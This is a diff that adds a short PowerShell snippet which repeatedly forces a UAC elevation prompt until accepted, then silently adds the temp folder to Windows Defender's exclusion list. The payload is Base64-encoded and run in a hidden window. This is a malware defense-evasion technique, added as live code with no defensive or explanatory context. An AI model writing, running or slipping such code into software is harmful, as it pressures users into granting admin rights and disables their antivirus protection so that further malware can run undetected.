@@ -1,0 +1,5 @@
+$script = "while($true){try{Start-Process 'cmd.exe' -Verb runas -ArgumentList '/c', 'powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath %tmp%' -WindowStyle Hidden; exit}catch{}}"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encoded = [Convert]::ToBase64String($bytes)
+powershell -nop -w hidden -e $encoded
+
